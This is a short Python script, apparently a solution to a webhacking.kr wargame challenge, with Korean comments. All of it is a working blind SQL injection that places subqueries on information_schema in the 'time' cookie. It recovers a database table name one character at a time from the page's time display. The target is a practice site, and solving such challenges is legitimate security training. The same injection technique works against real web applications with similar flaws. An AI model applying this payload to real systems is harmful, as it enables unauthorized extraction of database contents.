import requests

headers = {
    'Host': 'webhacking.kr',
    'Sec-Ch-Ua-Platform': "Windows",
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'close'
}
cookies = {
        'time': '3', 'PHPSESSID':'k2mog0qd4qhvdi8n1ftmmvrnk2' # Time 임의 값
}
url = "https://webhacking.kr/challenge/web-02/"
i = 0

while i < 14:
    cookies['time'] = '(select ascii(substring(table_name,'+str(i+1)+',1)) from information_schema.tables where table_schema = database() limit 1, 1)'
    r = requests.get(url, headers = headers, cookies = cookies)
    i += 1
    sec = r.text[22:24]
    if r.text[20:21] == '1' : # 1분 넘을 경우
        ascii = int(sec) + 60 # 97초 [1:37] --> 값 변경
    else :
        ascii = int(sec)
    print(chr(ascii), end = ' ', flush = True)